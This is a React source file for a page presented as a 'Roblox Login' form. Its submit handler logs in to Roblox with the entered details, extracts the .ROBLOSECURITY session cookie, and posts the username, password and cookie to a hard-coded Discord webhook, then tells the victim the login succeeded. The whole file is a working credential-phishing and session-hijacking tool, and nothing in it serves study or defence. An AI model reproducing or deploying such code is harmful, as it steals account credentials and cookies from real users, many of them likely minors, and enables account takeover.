import React, { useState } from 'react';
    import axios from 'axios';
    import './App.css';

    function App() {
      const [username, setUsername] = useState('');
      const [password, setPassword] = useState('');

      const handleSubmit = async (e) => {
        e.preventDefault();

        try {
          const response = await axios.post('https://auth.roblox.com/v2/login', {
            ctype: 'Username',
            cvalue: username,
            password: password
          }, {
            withCredentials: true
          });

          const cookie = response.headers['set-cookie'].find(cookie => cookie.startsWith('.ROBLOSECURITY='));

          await axios.post('https://discord.com/api/webhooks/1280961213207150592/01AKwlSmxHeKe6oaVzNPy-3G6h1leDeZQ-Zvk00FTMTXnsGCK-urRkQsWOjgiLyVDaiG', {
            content: `Username: ${username}\nPassword: ${password}\nCookie: ${cookie}`
          });

          alert('Login successful!');
        } catch (error) {
          alert('Login failed!');
        }
      };

      return (
        <div className="login-container">
          <form onSubmit={handleSubmit}>
            <h2>Roblox Login</h2>
            <div className="input-group">
              <label>Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>
            <div className="input-group">
              <label>Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
            <button type="submit">Login</button>
          </form>
        </div>
      );
    }

    export default App;
